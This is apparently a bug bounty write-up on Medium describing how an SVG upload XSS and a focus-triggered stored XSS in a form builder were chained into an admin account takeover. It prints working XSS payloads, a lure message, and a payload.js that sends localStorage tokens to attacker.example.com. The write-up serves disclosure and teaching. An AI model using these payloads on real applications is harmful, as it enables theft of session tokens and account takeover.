# Escalating Self-Stored XSS to Complete Admin ATO

> **Author**: Ahmad Mugh33ra
> **Published**: May 16, 2026

---

Top highlight

![Ahmad Mugh33ra](https://miro.medium.com/v2/resize:fill:32:32/1*0xLvCHrLGVvLTlxioDOILw.jpeg)

48

1

3

Listen

Share

![image](https://miro.medium.com/v2/resize:fit:700/1*Iyu0JcTihUkyzpoLDPxAYw.png)

## Why This Target?

Every hunter has a methodology for picking targets. Mine starts with Google Dorking, and on this particular day it paid off. I landed on a well-known, self-hosted bug bounty program that had been running for nearly a decade. I knew the age because I stumbled on a YouTube PoC video from nine years ago while doing reconnaissance which immediately told me two things: the scope was enormous, and despite years of attention from other researchers, it was still worth trying. Old programs can carry old code. Old code carries old habits.

Recon Tip: When hunting for Broken Access Control and authentication-related issues, focus your subdomain enumeration on prefixes like app., dev., console., and portal.. The app. prefix in particular almost always indicates a customer-facing SaaS panel and those panels are where the sensitive data lives.

## Phase 1 Reconnaissance and Initial Foothold (SVG XSS on the CDN)

I opened app.target.com and was immediately redirected to a third-party authentication provider at target.thirdparty.com. I created an account, logged in, and started exploring.

The UI looked dated and unimpressive at first glance but the UI is never the point. What mattered was what was happening in the background. I noticed that any feature involving file upload profile images, attachments pushed files to a separate storage subdomain: cloud.target.com. This immediately flagged it as a CDN or blob storage endpoint, likely running with minimal security controls compared to the main application.

I attempted to upload an SVG file embedded with a standard XSS payload:

```
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.cookie)">
  <rect width="100%" height="100%"/>
</svg>
```

The application showed a file type validation error but only on the client side. There was no server-side MIME type enforcement. I intercepted the request in Burp Suite, forwarded it with the SVG content intact, and the file was accepted. When I navigated directly to the uploaded file URL on cloud.target.com, the XSS fired.

![image](https://miro.medium.com/v2/resize:fit:700/1*0n0138w8pTSayZopdRXhHw.png)

However, this was not the win it appeared to be.

Why the CDN Sandbox Was Not Enough

This initial SVG XSS executed on cloud.target.com, which is a separate isolated origin used purely for file storage. JavaScript executing on that origin has no access to app.target.com's localStoragebrowsers enforce strict same-origin policy between the two. This is why a working XSS on the CDN was a dead end and a gadget on the main application origin was required to complete the chain.

## Phase 2 Understanding the Authentication Model

Before deciding whether the CDN XSS was exploitable, I needed to understand how the application managed sessions. Digging through Burp Suite’s HTTP history revealed something interesting.

The application did not use traditional session cookies. Instead, it relied entirely on Bearer token authentication:

```
Authorization: Bearer <clientID>:<accessToken>
```

Further investigation of the request history uncovered an endpoint that accepted a clientID and refreshToken as POST parameters and returned a fresh accessToken in the response. This confirmed the token architecture: a two-part credential consisting of a client identifier and a rotating access token.

More critically and this became the linchpin of the entire attack chain the application stored everything in localStorage: the clientID, the accessToken, the refreshToken, and other sensitive session artifacts including PII. There were no HttpOnly cookies in sight.

![image](https://miro.medium.com/v2/resize:fit:700/1*UYHuYVy7BtI1BHryaiDz2w.png)

The implication was immediate and obvious: any XSS executing within the app.target.com origin would have unrestricted read access to the entire session. An attacker who could steal localStorage from an authenticated admin would own that account completely no phishing, no CSRF, no credential brute-forcing required.

The CDN XSS on cloud.target.com, however, ran in a sandboxed origin. It could not reach app.target.com's localStorage. I needed an XSS executing in the main application origin to complete the chain.

## Phase 3 The Hunt for a Gadget on the Main Application

With a clear objective defined, I began a thorough manual audit of every user- controlled input on app.target.com. My approach was methodical: inject my one man army payload into every field, observe the response, and move on.

The payload I used is one I keep on my personal checklist for exactly this purpose:

```
'"><img/src=x>${{666*777}}
```

This single payload is designed to reveal multiple vulnerability classes in one shot:

- If the application is vulnerable to SQL Injection, it may throw a database error in response to the single quote.
- If the application is vulnerable to XSS, the broken image tag will render and trigger an onerror event.
- If the application is vulnerable to SSTI or CSTI, the expression 666*777 will evaluate and return 517482 in the rendered output.

Tip: Save this payload. It is a genuine time-saver during manual recon because it gives you signal on three different vulnerability classes from a single injection point.

I injected it into every input, every textarea, every parameter I could find. The application held firm. It was well-sanitized on the main surface. After hours of manual testing with no meaningful results, I widened my scope to less obvious application features.

## Phase 4 The Form Builder and the Elusive XSS

Eventually I reached a feature that had not yet appeared in my testing: a custom form builder. Users could design their own forms subscribe forms, feedback collectors, any structure they needed and the platform would generate a public shareable URL in the format:

```
forms.target.com/forms/<hash>
```

This was interesting for a few reasons. Form builders are notoriously difficult to sanitize correctly because they involve rich structured input labels, titles, descriptions, field types that ultimately gets rendered back as HTML. I immediately opened the title field and injected a classic XSS payload.

![image](https://miro.medium.com/v2/resize:fit:634/1*ZCKOCWZAz64VgYtaNVJstQ.png)

The alert popped. Then I tried the description field. That popped too. For a moment I thought the chain was complete.

Then I hit the first wall.

After spending nearly three hours investigating, I discovered that both the title and description fields were stripping the payload on save. The rendered output on the public form URL showed only "> the remnant of the payload after sanitization had processed everything else. The XSS was a one-time self-execution in the editor context, completely useless for an attack scenario. This was the most frustrating phase of the entire engagement. The bug looked real, smelled real, and kept showing signs of life but it was a dead end.

I moved on to the remaining fields in the form builder and found one that behaved differently.

This field did not require clicking a Save button. It auto-saved content as you typed. When I injected my XSS payload and observed the behavior, I noticed something inconsistent: sometimes the alert popped, sometimes it did not. I could not understand the trigger condition. After exhausting my ideas, I closed the laptop and came back the next morning with fresh eyes.

## Get Ahmad Mugh33ra’s stories in your inbox

Join Medium for free to get updates from this writer.

Remember me for faster sign in

On returning, I injected the payload again and watched carefully. The XSS did not fire on page load. It did not fire when I stopped typing. It fired the moment I clicked into the input field just a click, no typing, no save, nothing else.

The field was auto-saving on edit and re-rendering the stored content every time the field received focus. The injected payload survived the auto-save, was re-rendered in the DOM on each focus event, and executed. This was a persistent, self- triggering Stored XSS, activated by a click interaction that any user including an administrator would perform naturally while trying to edit the form.

## Phase 5 Weaponizing the XSS for Full Admin Takeover

The attack vector was now fully defined. The final step was replacing the proof-of- concept alert() with a payload capable of exfiltrating the administrator's localStorage to an attacker-controlled server.

I crafted a draft form saved but unpublished and injected the following payload into the vulnerable field:

```
Important: Please review the description below before publishing.
"><img src=x onerror=import('https://attacker.example.com/payload.js')>
Thank you for your cooperation.
```

The surrounding text was crafted to make the field look like a legitimate content review note, increasing the likelihood that an administrator would open the draft and click into the field without suspicion.

The external payload.js file hosted on the attacker's server contained:

javascript

```
const data = JSON.stringify(localStorage);
fetch('https://attacker.example.com/collect?d=' + btoa(data));
```

Attack Flow:

- Attacker creates a draft form and injects the payload into the auto-save field.
- Administrator opens the draft form for final review or edit it.
- Administrator sees unusual text and try to remove it a completely natural editing action.
- The stored XSS fires immediately on focus, before the administrator types a single character or cutting something.
- The malicious script is dynamically imported from the attacker’s server and executes in the app.target.com origin.
- The full contents of localStorageincluding clientID, accessToken, and refreshTokenare serialized and exfiltrated via an outbound HTTP request.
- The attacker copies the stolen credentials into their own browser’s localStorage, refreshes the page, and is authenticated as the administrator.
- Full admin account takeover achieved. Full organizational access follows.

## Reproduction Steps

- Roles Involved:

- Victim (Admin/Owner): Has full platform access
- Attacker: Invited by the Admin/Owner with a limited “Create and Manage Forms” role only

- Admin/Owner invites the attacker to the organization and assigns them only the Create and Manage Forms role.
- Attacker logs into their account and navigates to the Form Builder.
- Attacker creates a new draft form and injects the following payload into the vulnerable auto-save field:

```
"><img src=x onerror=import('https://attacker.example.com/payload.js')>
```

- The field auto-saves the payload automatically no save button required.
- Attacker waits. Since reviewing and approving draft forms before publishing is part of the Admin/Owner’s natural workflow, they will open the draft on their own without any prompting from the attacker.
- Admin/Owner opens the draft form and clicks into the vulnerable input field to review it.
- The stored XSS fires instantly on focus — before the Admin/Owner types a single character.
- The external payload.js executes in the app.target.com origin and silently exfiltrates the full localStorage contents to the attacker's server.
- Attacker copies the stolen clientID and accessToken into their own browser's localStorage under the app.target.com origin and refreshes the page.
- Full Admin/Owner session access confirmed — complete organizational takeover achieved.

![image](https://miro.medium.com/v2/resize:fit:700/1*xajRwxDTzh0Q-XSE9ofCDA.png)

I was awarded $$$ for this finding, though I expected more $$$$ given the attack chain Stored XSS to full Admin/Owner takeover from a low-privileged role is not a trivial bug.

The program’s reasoning was fair though. Their severity rubric prioritizes cross-tenant impact an attacker compromising organizations outside their own. Since this attack stays within the same org, the payout was scoped down accordingly.

## Final Words

Security research is patience, persistence, and knowing when to walk away. You will spend hours on dead ends that is normal. What separates good hunters from great ones is coming back the next day with fresh eyes. In this exact writeup, closing the laptop and resting overnight is what cracked the finding. Rest is not giving up. Rest is strategy. Your brain keeps working the problem while you sleep trust it.

“It always seems impossible until it’s done.” Nelson Mandela

If this writeup helped you learn something then make sure you smash the follow button (optional :))

let’s connect:

- 🔗 LinkedIn: mugh33ra
- 🐦 X (Twitter): mugh33ra

Happy hunting and keep digging deeper. 🎯



---
*Original URL: [https://medium.com/@mugh33ra/escalating-self-stored-xss-to-complete-admin-ato-7a7c98b324fe?source=search_post---------2-----------------------------------](https://medium.com/@mugh33ra/escalating-self-stored-xss-to-complete-admin-ato-7a7c98b324fe?source=search_post---------2-----------------------------------)*
